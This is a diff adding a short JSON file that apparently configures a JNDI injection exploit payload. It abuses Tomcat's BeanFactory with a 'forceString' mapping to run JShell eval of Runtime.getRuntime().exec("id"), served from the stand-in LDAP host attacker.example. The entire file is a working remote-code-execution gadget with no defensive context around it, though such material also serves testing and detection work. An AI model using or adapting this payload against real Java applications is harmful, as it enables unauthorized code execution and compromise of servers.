@@ -1,0 +1,12 @@
+{
+    "attack_type": "jndi_factory",
+    "factory_class": "org.apache.naming.factory.BeanFactory",
+    "reference_class": "jdk.jshell.JShell",
+    "factory_attrs": {
+        "forceString": "x=eval",
+        "x": "Runtime.getRuntime().exec(\"id\")"
+    },
+    "sink_type": "jshell_eval",
+    "protocol": "ldap",
+    "lookup_url": "ldap://attacker.example:1389/exploit"
+}
